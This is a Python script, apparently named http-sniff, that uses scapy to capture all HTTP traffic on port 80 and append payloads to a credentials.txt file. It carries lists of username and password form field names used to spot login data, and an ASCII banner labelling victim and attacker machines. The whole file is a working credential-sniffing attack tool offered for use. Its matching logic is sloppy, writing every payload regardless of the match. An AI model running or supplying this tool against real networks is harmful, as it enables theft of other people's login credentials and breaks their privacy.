#!/usr/bin/python

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# http-sniff is a programm for sniff all http trafic.
#
# bug-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# bug-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#


import os
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re
import sys 


print("\033[1;36m" + " _______________             _______________             _______________   ")
print("\033[1;36m" + "|               |           |               |           |               |  ")
print("\033[1;36m" + "|   VICTIM PC   |-----------|    ROUTER     |-----------|   VICTIM PC   |  ")
print("\033[1;36m" + "|_______________|      _____|_______________|_____      |_______________|  ")
print("\033[1;36m" + "       | |            |           ( B )           |            | |         ")
print("\033[1;36m" + "       | |            |           ( Y )           |            | |         ")
print("\033[1;36m" + "     __|_|__          |           ( T )           |          __|_|__       ")
print("\033[1;36m" + "                 _____|           ( E )           |_____                   ")
print("\033[1;36m" + "                |                 ( S )                 |                  ")
print("\033[1;36m" + " _______________|            _____(dec)_____            |_______________   ")
print("\033[1;36m" + "|               |           |               |           |               |  ")
print("\033[1;36m" + "|   SERVER PC   |  11111111 | {ATTACKER PC} | 00000000  |  DATABASE PC  |  ")
print("\033[1;36m" + "|_______________|           |______   ______|           |_______________|  ")
print("\033[1;36m" + "       | |                        ( + )                         | |        ")
print("\033[1;36m" + "       | |                        ( + )                         | |        ")
print("\033[1;36m" + "     __|_|__                      ( + )                       __|_|__      ")
print("\033[1;36m" + "                            ______( + )______                              ")
print("\033[1;36m" + "                           |  +++++++++++++  |                             ")
print("\033[1;36m" + "                           |  ++ PAYLOAD ++  |                             ")
print("\033[1;36m" + "                           |  +++++++++++++  |                             ")
print("\033[1;36m" + "                           |_________________|                             ")


def cls():
 os.system('cls' if os.name=='nt' else 'clear')


USERNAME_FIELDS = ['auth', 'log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'email']

PASSWORD_FIELDS = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd','pws','upasswd']


#OTHER_FILEDS = ['', ' ']

# Open a file and write the http trafic
HTTP_TRAFIC = open("credentials.txt", "a+")

def packet_callback(packet):

    if packet[TCP].payload:

        pkt = str(packet[TCP].payload)

        if packet[IP].dport == 80:

         for i,j in zip(range(39), range(21)):

          if USERNAME_FIELDS[i] in str(bytes(packet[TCP].payload)) and PASSWORD_FIELDS[j] in str(bytes(packet[TCP].payload)):


           print("\033[1;37m" + "\n{----HTTP---->" + packet[IP].src + "}" + "\n" + "\033[1;32m" + str(bytes(packet[TCP].payload)))


           HTTP_TRAFIC.write(str(bytes(packet[TCP].payload)))


          elif USERNAME_FIELDS[i] not in str(bytes(packet[TCP].payload)) or PASSWORD_FIELDS[j] not in str(bytes(packet[TCP].payload)):
   

           print("\033[1;37m" + "\n{----HTTP---->" + packet[IP].src + "}" + "\n" + "\033[1;32m" + str(bytes(packet[TCP].payload)))

         
           HTTP_TRAFIC.write(str(bytes(packet[TCP].payload)))


sniff(filter="tcp", prn=packet_callback, store=0)


# Close the file for credentials http trafic
HTTP_TRAFIC.close()

cls()
